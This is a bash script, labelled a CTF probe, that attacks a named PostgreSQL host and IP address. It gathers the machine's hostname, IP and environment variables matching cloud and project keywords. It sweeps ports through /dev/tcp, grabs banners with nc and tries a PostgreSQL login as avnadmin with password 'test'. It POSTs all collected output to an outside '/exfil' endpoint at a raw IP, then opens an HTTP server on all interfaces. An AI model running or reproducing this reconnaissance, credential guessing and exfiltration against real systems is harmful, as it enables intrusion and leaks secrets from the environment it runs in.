#!/bin/bash
# CTF probe v2 - inside-perimeter sweep + PG attack chain
TARGET=falcon-bug-bounty-flag-pgsql-dev-sandbox.aivencloud.com
IP=132.145.191.135
OUT=/tmp/probe_results.txt
echo "=== PROBE V2 START $(date -u) ===" > $OUT
echo "HOSTNAME: $(hostname)" >> $OUT
echo "MY IP: $(hostname -I 2>/dev/null | head -1)" >> $OUT
echo "=== ENV INTEL ===" >> $OUT
env | grep -iE "avn|cloud|region|runtime|project|service" | head -20 >> $OUT

echo "=== DNS ===" >> $OUT
dig +short $TARGET >> $OUT 2>&1 || nslookup $TARGET >> $OUT 2>&1
getent hosts $TARGET >> $OUT 2>&1

echo "=== FULL PORT SWEEP ===" >> $OUT
for p in 22 80 443 5432 5433 6432 8008 8080 8443 22292 22293 22294 22295 22296 22297 22298 22300 54321 6543 6379 9200 2379 2380 9100 9187 10250 15021 3000 9090 16000 5600 6443 54320 28001; do
  timeout 3 bash -c "echo > /dev/tcp/$IP/$p" 2>/dev/null && echo "OPEN $p" >> $OUT || echo "closed $p" >> $OUT
done

echo "=== PG HANDSHAKES ===" >> $OUT
for p in 5432 5433 6432 22293 54321 28001; do
  echo "--- :$p ---" >> $OUT
  timeout 5 bash -c "echo -n | nc -w 3 $IP $p" >> $OUT 2>&1
  echo "" >> $OUT
done

echo "=== PG AUTH ATTEMPT (psql) ===" >> $OUT
for p in 5432 5433 22293 54321; do
  echo "--- psql :$p ---" >> $OUT
  timeout 6 psql "postgresql://avnadmin:test@$IP:$p/postgres?connect_timeout=4" -c "SELECT version();" >> $OUT 2>&1
  echo "" >> $OUT
done

echo "=== SSH ===" >> $OUT
timeout 5 bash -c "echo | nc -w 3 $IP 22" >> $OUT 2>&1

echo "=== HTTP ===" >> $OUT
for p in 8008 8080 8443 3000 9090 80 443; do
  echo "--- :$p ---" >> $OUT
  timeout 5 curl -sk -m 4 "http://$IP:$p/" -o - 2>&1 | head -c 300 >> $OUT
  echo "" >> $OUT
done

echo "=== EXFIL ===" >> $OUT
curl -s -m 10 -X POST "http://89.106.78.234:8900/exfil" -d @$OUT -o /dev/null 2>&1
echo "DONE"
# keep alive for port exposure
python3 -m http.server 8080 --bind 0.0.0.0 >/dev/null 2>&1 &
wait
